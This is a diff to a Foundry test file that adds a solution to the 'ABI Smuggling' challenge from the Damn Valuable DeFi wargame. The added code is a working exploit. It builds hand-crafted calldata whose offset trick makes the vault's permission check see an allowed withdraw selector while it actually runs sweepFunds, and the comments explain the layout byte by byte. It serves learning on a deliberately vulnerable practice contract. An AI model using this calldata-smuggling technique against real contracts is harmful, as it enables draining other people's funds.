@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,36 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // 0x1cff79cd                                                       : execute function selector - 4 bytes
+        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 : target address (1st param) - 32 bytes
+        // 0000000000000000000000000000000000000000000000000000000000000064 : actionData bytes offset - 32 bytes
+        // 0000000000000000000000000000000000000000000000000000000000000000 : empty to miscalculate calldataOffset - 32 bytes
+        // d9caed12                                                         : withdraw function selector (fake selector check) - 4 bytes
+        // 0000000000000000000000000000000000000000000000000000000000000044 : length of actionData - 32 bytes
+        // 85fb709d                                                         : sweepFunds function selector - 4 bytes
+        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea : sweepFunds 1st param (recovery) - 32 bytes
+        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b : sweepFunds 2nd param (token) - 32 bytes
+
+        bytes memory callBytes = abi.encodePacked(
+            bytes4(AuthorizedExecutor.execute.selector),
+            abi.encode(address(vault)),
+            abi.encode(uint256(4 + 32 * 3)),
+            bytes32(""),
+            bytes4(SelfAuthorizedVault.withdraw.selector),
+            abi.encode(
+                uint256(
+                    bytes(
+                        abi.encodeWithSelector(
+                            SelfAuthorizedVault.sweepFunds.selector, address(recovery), address(token)
+                        )
+                    ).length
+                )
+            ),
+            abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, address(recovery), address(token))
+        );
+        console.logBytes(callBytes);
+
+        (bool success, bytes memory data) = address(vault).call(callBytes);
     }
 
     /**
